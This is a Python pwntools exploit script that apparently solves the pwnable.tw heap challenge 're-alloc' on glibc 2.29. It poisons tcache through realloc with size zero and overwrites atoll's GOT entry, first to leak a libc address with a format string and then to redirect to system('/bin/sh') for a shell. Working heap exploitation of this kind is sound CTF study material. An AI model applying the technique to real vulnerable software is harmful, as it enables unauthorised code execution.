#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./re-alloc"
ip = "chall.pwnable.tw"
port = 10106

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc-2.29.so"
if LOCAL:
    # io = process(filename)
    # libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    io = process(["./ld-2.29.so", filename], env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc


def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice: ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, idx, size, con):
    choice(io, 1)
    sla(io, "Index:", str(idx))
    sla(io, "Size:", str(size))
    sa(io, "Data:", con)

def readd(io, idx, size, con):
    choice(io, 2)
    sla(io, "Index:", str(idx))
    sla(io, "Size:", str(size))
    sa(io, "Data:", con)

def remove(io, idx):
    choice(io, 3)
    sla(io, "Index:", str(idx))

bps.append("*0x40129D")  
gds['data']=0x4040B0



target_1 = elf.got['atoll']

add(io, 1, 0x18, b'a'*8)

add(io, 0, 0x18, b'a'*0x8)

remove(io, 1)

choice(io, 2)
sla(io, "Index:", str(0))
sla(io, "Size:", str(0))

readd(io, 0, 0x28, p64(target_1)*2)

remove(io, 0)

add(io, 0, 0x28, p64(target_1))

add(io, 1, 0x18, b'c')

remove(io, 0)
readd(io, 1, 0x38, b'd'*0x10)
remove(io ,1)

# add(io, 0, 0x18, b'a'*0x8)

# choice(io, 2)
# sla(io, "Index:", str(0))
# sla(io, "Size:", str(0))

# readd(io, 0, 0x28, p64(target_1)*2)

# remove(io, 1)

# remove(io, 0)

# add(io, 0, 0x18, p64(target_1))

# add(io, 1, 0x28, b'c')

# readd(io, 0, 0x38, b'd')
# remove(io, 0)

# readd(io, 1, 0x38, b'd'*0x10)

# remove(io ,1)


### second

target_2 = elf.got['atoll']


add(io, 1, 0x58, b'a'*8)


add(io, 0, 0x48, b'a'*0x8)

choice(io, 2)
sla(io, "Index:", str(0))
sla(io, "Size:", str(0))

readd(io, 0, 0x58, p64(target_2)*2)

remove(io, 1)

remove(io, 0)

add(io, 0, 0x48, p64(target_2))

add(io, 1, 0x58, b'c')

readd(io, 0, 0x68, b'd')
remove(io, 0)

readd(io, 1, 0x68, b'd'*0x10)

remove(io ,1)


### overwrite 



add(io, 0, 0x58, b'p\x10@\x00\x00\x00\n')



choice(io, 1)
sla(io, "Index:", "%23$p")

libc_addr = int(io.recvuntil("\n", drop=False), 16)
libc_base = libc.address = libc_addr - 0x26b6b

log.info("libc_addr :0x%x", libc_addr)
log.info("libc_base :0x%x", libc_base)
log.info("system :0x%x", libc.sym['system'])
input()

# # add(io, 1, 0x58, p64(libc.sym['system']))

choice(io, 1)
sa(io, "Index:", b'\n')
sla(io, "Size:", b'a'*0xf)
sa(io, "Data:", p64(libc.sym['system'])+p64(libc.sym['ssignal'])[:6])

# mydebug(io, "")

choice(io, 3)
sla(io, "Index:", b'/bin/sh\x00')


io.interactive()